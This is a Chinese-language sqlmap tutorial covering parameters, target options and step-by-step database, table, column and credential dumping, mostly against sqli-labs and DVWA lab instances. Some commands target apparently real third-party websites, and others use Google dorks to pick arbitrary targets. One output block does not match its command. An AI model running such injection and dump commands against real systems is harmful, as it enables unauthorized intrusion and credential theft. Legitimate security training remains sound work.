sqlmap goal is to detect and take advantage of SQL injection vulnerabilities in web applications.

## 1. Install

安装

```
┌──(sec@debian)-[~]
└─$ sudo apt install -y sqlmap
```

## 2. Usage

### 2.1. 常用参数

`--beep` 出现问题提醒或在发现 SQL 注入时发出提示

`--batch` 以默认参数运行

`-f` 快速测试

`-b` 获得详细的数据仓库版本

`--level 5` 更详细地对更大范围 payloads 和 boundaries（作为 SQL payload 的前缀和后缀）进行检测

`--risk 2` 在默认的检测上添加大量时间型盲注（Time-based blind）语句测试

`--random-agent` 使用随机的 HTTP User-Agent

| 操作     | 描述                                                         |
| -------- | ------------------------------------------------------------ |
| --risk 1 | 对大多数 SQL 注入点而言是没有任何风险的                      |
| --risk 2 | 在默认的检测上添加大量时间型盲注（Time-based blind）语句测试 |
| --risk 3 | 在原基础上添加`OR` 类型的布尔型盲注（Boolean-based blind）测试（可能对数据库进行增删改查，不推荐，得到授权的目标可以手动测试） |

`-v` 输出详细等级，默认级别为 1

| 操作 | 描述                                         |
| ---- | -------------------------------------------- |
| -v 0 | 只输出 Python 出错回溯信息，错误和关键信息。 |
| -v 1 | 增加输出普通信息和警告信息。                 |
| -v 2 | 增加输出调试信息。                           |
| -v 3 | 增加输出已注入的 payloads。                  |
| -v 4 | 增加输出 HTTP 请求。                         |
| -v 5 | 增加输出 HTTP 响应头。                       |
| -v 6 | 增加输出 HTTP 响应内容。                     |

### 2.2. 高级参数

`--cookie ""` 调用 cookie

`--proxy ""` 配置代理

`--second-url ""` 二阶 SQL 注入攻击

`--delay 3` 设置每个 HTTP 请求的延迟 3 秒

`--tamper=xxx.py` 调用脚本

### 2.3. 指定目标

`-d ""` 直连数据库

```
sqlmap -d "mysql://admin:admin@192.168.21.17:3306/testdb"
```

`-u ""` 目标 URL

```
sqlmap -u "http://www.target.com/vuln.php?id=1"
```

`-l ""` 从 Burp 或 WebScarab 代理日志解析目标

```
sqlmap -l "lo.txt"
```

`-x ""` 从远程站点地图（.xml）解析目标

```
sqlmap -x "http://www.target.com/sitemap.xml"
```

`-m ""` 从给定的文本文件读取多个目标进行扫描

```
sqlmap -m "target.txt"
```

`-r ""` 从文件中载入 HTTP 请求

```
sqlmap -r "http.txt"
```

`-g ""` 使用 Google dork 结果作为目标地址

```
sqlmap -g "inurl:\".php?id=1\""
```

`-c ""` 从 INI 配置文件中读取选项

```
sqlmap -c "sqlmap.conf"
```

### 2.4. 获取内容

`-a` 获取所有数据

`-D ""` 获取数据库

`-T ""` 获取数据表

`-C ","` 获取字段

### 2.5. 枚举

`--dbs` 列出所有数据库

`--current-db` 获取当前数据库

`--tables` 列出所有数据表

`--columns` 列出所有字段

`--dump` 导出数据

### 2.6. 常规注入

判断是否存在 `sql` 注入

```
┌──(root㉿kali)-[~]
└─# sqlmap -u "http://www.golden-wall.net/" --level 5 --risk 2 -f -b --beep --random-agent
```

爆库

```
┌──(root㉿kali)-[~]
└─# sqlmap -u "https://www.hpwsxx.com/about.asp?id=1" --level 5 --risk 2 -f -b --random-agent --dbs
```

```
available databases [9]:
[*] challenges
[*] dvwa
[*] information_schema
[*] mysql
[*] performance_schema
[*] pikachu
[*] security
[*] test
[*] ultrax
```

爆表

```
┌──(root㉿kali)-[~]
└─# sqlmap -u "http://192.168.1.76/sqli-labs/Less-1/?id=1" --level 5 --risk 2 -f -b --random-agent -D "security" --tables
```

```
Database: security
[4 tables]
+----------+
| emails   |
| referers |
| uagents  |
| users    |
+----------+
```

爆字段

```
┌──(root㉿kali)-[~]
└─# sqlmap -u "http://192.168.1.76/sqli-labs/Less-1/?id=1" --level 5 --risk 2 -f -b --random-agent -D "security" -T "users" --columns
```

```
Database: security   
Table: users
[3 columns]
+----------+-------------+
| Column   | Type        |
+----------+-------------+
| id       | int(3)      |
| password | varchar(20) |
| username | varchar(20) |
+----------+-------------+
```

拖库

```
┌──(root㉿kali)-[~]
└─# sqlmap -u "http://192.168.1.76/sqli-labs/Less-1/?id=1" --level 5 --risk 2 -f -b --random-agent -D "security" -T "users" -C "username,password" --dump
```

```
Database: security
Table: users
[13 entries]
+----------+------------+
| username | password   |
+----------+------------+
| admin    | admin      |
| admin1   | admin1     |
| admin2   | admin2     |
| admin3   | admin3     |
| admin4   | admin4     |
| secure   | crappy     |
| Dumb     | Dumb       |
| dhakkan  | dumbo      |
| superman | genious    |
| Angelina | I-kill-you |
| batman   | mob!le     |
| Dummy    | p@ssword   |
| stupid   | stupidity  |
+----------+------------+
```

### 2.7. 进阶注入

**DVWA**

Low

```
┌──(root㉿kali)-[~]
└─# sqlmap -u "http://192.168.1.76/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie "security=low; PHPSESSID=q8uc96fhrl7nb0oade3jt6tcc0" --level 5 --risk 2 -f -b --beep
```

> 需要登录的网站要调用 `cookie` ，否则会在登录页面注入

Medium

```
┌──(root㉿kali)-[~]
└─# nano http.txt
```

```http
POST /DVWA/vulnerabilities/sqli/ HTTP/1.1
Host: 192.168.1.76
Content-Length: 18
Cache-Control: max-age=0
Origin: http://192.168.1.76
DNT: 1
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://192.168.1.76/DVWA/vulnerabilities/sqli/
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=7sfpgusikf8ibfe74qp23phik5; security=medium
Connection: close

id=1&Submit=Submit
```

```
┌──(root㉿kali)-[~]
└─# sqlmap -r "http.txt" --level 5 --risk 2 -f -b --beep
```

> 需要以 POST 方式注入的网站要读取请求头

High

```
┌──(root㉿kali)-[~]
└─# vim http.txt
```

```http
POST /DVWA/vulnerabilities/sqli/session-input.php HTTP/1.1
Host: 192.168.1.76
Content-Length: 18
Cache-Control: max-age=0
Origin: http://192.168.1.76
DNT: 1
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://192.168.1.76/DVWA/vulnerabilities/sqli/session-input.php
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=jdo75sb7vl2js0f8lscfsi5rd7; security=high
Connection: close

id=1&Submit=Submit
```

```
┌──(root㉿kali)-[~]
└─# sqlmap -r "http.txt" --second-url "http://192.168.1.76/DVWA/vulnerabilities/sqli/" --level 5 --risk 2 -f -b --beep
```

> 这里会在新的窗口提交参数，需要使用二阶注入，请求头是在新的窗口提交参数后拦截的，`--second-url` 指向的是源目标网址

lmpossible

### 2.8. Proxy

BurpSuite 开启上游服代理, 配置代理启动 `sqlmap` 

```
┌──(root㉿kali)-[~]
└─# sqlmap -g "inurl:\".asp?id=24\"" --proxy "http://127.0.0.1:8080" --level 5 --risk 2 -f -b --beep
```

> 由于 `ssl` 证书的问题，`sqlmap` 对 `https` 的网站进行扫描时需要通过 `burpsuite` 中转

---

References

- [sqlmap](https://www.kali.org/tools/sqlmap/)
